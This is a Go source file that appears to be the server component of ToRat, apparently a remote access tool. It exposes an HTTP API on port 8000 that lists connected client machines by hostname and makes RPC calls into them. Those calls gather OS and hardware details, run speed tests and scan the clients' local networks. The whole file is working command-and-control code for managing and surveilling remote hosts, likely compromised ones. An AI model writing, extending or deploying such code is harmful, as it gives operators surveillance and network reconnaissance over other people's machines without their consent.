package server

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"

	"github.com/gorilla/mux"
	"github.com/lu4p/ToRat/shared"
)

func APIServer() {
	router := mux.NewRouter().StrictSlash(true)

	router.HandleFunc("/clients", getClients).Methods("GET")
	router.HandleFunc("/clients/{id}/osinfo", getClientOSInfo).Methods("GET")
	router.HandleFunc("/clients/{id}/hardware", getClientHardware).Methods("GET")
	router.HandleFunc("/clients/{id}/speedtest", getClientSpeedtest).Methods("GET")
	router.HandleFunc("/clients/{id}/netscan", getClientNetscan).Methods("GET")

	log.Fatal(http.ListenAndServe(":8000", router))
}

// useful functions for stuff'n such
func getClientIDs() []string {
	var clients []string
	for _, c := range activeClients {
		clients = append(clients, c.Hostname)
	}
	return clients
}

func getActiveClientByID(id string) (*activeClient, error) {
	for _, c := range activeClients {
		if c.Hostname == id {
			return &c, nil
		}
	}
	return nil, fmt.Errorf("No Client found with ID %s", id)
}

// http REST functions
func getClientHardware(w http.ResponseWriter, r *http.Request) {
	var (
		ac  *activeClient
		err error
	)
	if ac, err = getActiveClientByID(mux.Vars(r)["id"]); err != nil {
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprintf(w, err.Error())
		return
	}
	hardware := shared.Hardware{}
	if err = ac.RPC.Call("API.GetHardware", void, &hardware); err != nil {
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprintf(w, "null")
		return
	}
	json.NewEncoder(w).Encode(hardware)
}
func getClientOSInfo(w http.ResponseWriter, r *http.Request) {
	var (
		ac  *activeClient
		err error
	)
	if ac, err = getActiveClientByID(mux.Vars(r)["id"]); err != nil {
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprintf(w, err.Error())
		return
	}
	osinfo := shared.OSInfo{}
	if err = ac.RPC.Call("API.GetOSInfo", void, &osinfo); err != nil {
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprintf(w, "null")
		return
	}
	json.NewEncoder(w).Encode(osinfo)
}
func getClientSpeedtest(w http.ResponseWriter, r *http.Request) {
	var (
		ac  *activeClient
		err error
	)
	if ac, err = getActiveClientByID(mux.Vars(r)["id"]); err != nil {
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprintf(w, err.Error())
		return
	}
	speedtest := shared.Speedtest{}
	if err = ac.RPC.Call("API.Speedtest", void, &speedtest); err != nil {
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprintf(w, "null")
		return
	}
	json.NewEncoder(w).Encode(speedtest)
}
func getClientNetscan(w http.ResponseWriter, r *http.Request) {
	var (
		ac  *activeClient
		err error
	)
	if ac, err = getActiveClientByID(mux.Vars(r)["id"]); err != nil {
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprintf(w, err.Error())
		return
	}
	gomap := shared.Gomap{}
	if err = ac.RPC.Call("API.GomapLocal", void, &gomap); err != nil {
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprintf(w, "null")
		return
	}
	json.NewEncoder(w).Encode(gomap)
}
func getClients(w http.ResponseWriter, r *http.Request) {
	json.NewEncoder(w).Encode(getClientIDs())
}
